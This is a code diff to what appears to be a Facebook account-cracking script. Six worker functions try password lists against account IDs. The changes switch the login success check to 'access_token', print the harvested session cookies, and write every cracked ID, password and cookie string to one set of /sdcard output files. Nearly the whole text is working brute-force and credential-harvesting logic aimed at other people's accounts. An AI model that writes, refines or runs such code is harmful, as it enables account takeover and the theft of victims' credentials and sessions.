@@ -63,7 +63,7 @@ BH = '\x1b[1;102m'
 BM = '\x1b[1;101m' 
 BA = '\x1b[1;100m' 
 my_color = [
- P, M, H, K, B, U, O, N]
+ P, M, H, K, B, U, O, N, R, Y,]
 warna = random.choice(my_color)
 ###----------[ CONVERT LINE ]----------###
 led = f'{M} -{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}{M}-{M}-{M}-{H}-{M}'
@@ -103,7 +103,6 @@ faltu = "\033[1;47m"
 pvt = "\033[1;0m"
 gren = "\x1b[38;5;154m"
 gas = "\033[1;32m"
-my_color = [white,blue,green];warna = random.choice(my_color)
 loop = 0
 oks = []
 cps = []
@@ -605,17 +604,18 @@ def __MTDONEE__(ids, names, passlist, total_ids):
             c.close()
             po = buffer.getvalue().decode('utf-8')
             q = json.loads(po)
-            if 'session_key' in q:
+            if 'access_token' in q:
                 response_data = json.loads(po)
                 cookies = response_data.get("session_cookies")
                 coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
-                print(f'\r\r{rad}[{green}zar0-💚{rad}]{green} {ids} {rad}▶︎ {green}{pas}')
+                print(f'\r\r{rad}[{green}zar0-OK{rad}]{green} {ids} {rad}: {green}{pas}')
+                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{coki}")
                 oks.append(ids)
-                open('/sdcard/zar0-M1-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M1-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
+                open('/sdcard/zar0-M6-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                 break
             elif "User must verify their account" in po:
                 cps.append(ids)
-                print(f'\r\r{rad}[zar0-CP]{rad} {ids} {rad}| {pas}')
+                #print(f'\r\r{rad}[zar0-CP]{rad} {ids} {rad}| {pas}')
                 open('/sdcard/zar0-CP.txt', 'a').write(ids + '|' + pas + '\n')
                 break
             else:
@@ -625,6 +625,7 @@ def __MTDONEE__(ids, names, passlist, total_ids):
         time.sleep(10)
     except Exception as e:
         pass
+
 
 def __MTDTWOO__(ids, names, passlist, total_ids):
     global oks,cps,loop
@@ -699,17 +700,18 @@ def __MTDTWOO__(ids, names, passlist, total_ids):
             c.close()
             po = buffer.getvalue().decode('utf-8')
             q = json.loads(po)
-            if 'session_key' in q:
+            if 'access_token' in q:
                 response_data = json.loads(po)
                 cookies = response_data.get("session_cookies")
                 coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
-                print(f'\r\r{rad}[{green}zar0-💚{rad}]{green} {ids} {rad}▶︎ {green}{pas}')
+                print(f'\r\r{rad}[{green}zar0-OK{rad}]{green} {ids} {rad}: {green}{pas}')
+                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{coki}")
                 oks.append(ids)
-                open('/sdcard/zar0-M2-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M2-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
+                open('/sdcard/zar0-M6-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                 break
             elif "User must verify their account" in po:
                 cps.append(ids)
-                print(f'\r\r{rad}[zar0-CP]{rad} {ids} {rad}| {pas}')
+                #print(f'\r\r{rad}[zar0-CP]{rad} {ids} {rad}| {pas}')
                 open('/sdcard/zar0-CP.txt', 'a').write(ids + '|' + pas + '\n')
                 break
             else:
@@ -794,13 +796,14 @@ def __MTDTHREE__(ids, names, passlist, total_ids):
             c.close()
             po = buffer.getvalue().decode('utf-8')
             q = json.loads(po)
-            if 'session_key' in q:
+            if 'access_token' in q:
                 response_data = json.loads(po)
                 cookies = response_data.get("session_cookies")
                 coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
-                print(f'\r\r{rad}[{green}zar0-💚{rad}]{green} {ids} {rad}▶︎ {green}{pas}')
+                print(f'\r\r{rad}[{green}zar0-OK{rad}]{green} {ids} {rad}: {green}{pas}')
+                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{coki}")
                 oks.append(ids)
-                open('/sdcard/zar0-M3-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M3-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
+                open('/sdcard/zar0-M6-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                 break
             elif "User must verify their account" in po:
                 cps.append(ids)
@@ -814,6 +817,7 @@ def __MTDTHREE__(ids, names, passlist, total_ids):
         time.sleep(10)
     except Exception as e:
         pass
+
 
 def __MTDFOUR__(ids, names, passlist, total_ids):
     global oks,cps,loop
@@ -888,13 +892,14 @@ def __MTDFOUR__(ids, names, passlist, total_ids):
             c.close()
             po = buffer.getvalue().decode('utf-8')
             q = json.loads(po)
-            if 'session_key' in q:
+            if 'access_token' in q:
                 response_data = json.loads(po)
                 cookies = response_data.get("session_cookies")
                 coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
-                print(f'\r\r{rad}[{green}zar0-💚{rad}]{green} {ids} {rad}▶︎ {green}{pas}')
+                print(f'\r\r{rad}[{green}zar0-OK{rad}]{green} {ids} {rad}: {green}{pas}')
+                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{coki}")
                 oks.append(ids)
-                open('/sdcard/zar0-M4-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M4-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
+                open('/sdcard/zar0-M6-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                 break
             elif "User must verify their account" in po:
                 cps.append(ids)
@@ -908,6 +913,7 @@ def __MTDFOUR__(ids, names, passlist, total_ids):
         time.sleep(10)
     except Exception as e:
         pass
+
 
 def __MTDFIVE__(ids, names, passlist, total_ids):
     global oks,cps,loop
@@ -988,13 +994,14 @@ def __MTDFIVE__(ids, names, passlist, total_ids):
             c.close()
             po = buffer.getvalue().decode('utf-8')
             q = json.loads(po)
-            if 'session_key' in q:
+            if 'access_token' in q:
                 response_data = json.loads(po)
                 cookies = response_data.get("session_cookies")
                 coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
-                print(f'\r\r{rad}[{green}zar0-💚{rad}]{green} {ids} {rad}▶︎ {green}{pas}')
+                print(f'\r\r{rad}[{green}zar0-OK{rad}]{green} {ids} {rad}: {green}{pas}')
+                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{coki}")
                 oks.append(ids)
-                open('/sdcard/zar0-M5-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M5-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
+                open('/sdcard/zar0-M6-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                 break
             elif "User must verify their account" in po:
                 cps.append(ids)
@@ -1008,6 +1015,8 @@ def __MTDFIVE__(ids, names, passlist, total_ids):
         time.sleep(10)
     except Exception as e:
         pass
+
+
 
 def __MTDSIX__(ids, names, passlist, total_ids):
     global oks,cps,loop
@@ -1079,11 +1088,12 @@ def __MTDSIX__(ids, names, passlist, total_ids):
             c.close()
             po = buffer.getvalue().decode('utf-8')
             q = json.loads(po)
-            if 'session_key' in q:
+            if 'access_token' in q:
                 response_data = json.loads(po)
                 cookies = response_data.get("session_cookies")
                 coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
-                print(f'\r\r{rad}[{green}zar0-💚{rad}]{green} {ids} {rad}▶︎ {green}{pas}')
+                print(f'\r\r{rad}[{green}zar0-OK{rad}]{green} {ids} {rad}: {green}{pas}')
+                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{coki}")
                 oks.append(ids)
                 open('/sdcard/zar0-M6-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                 break
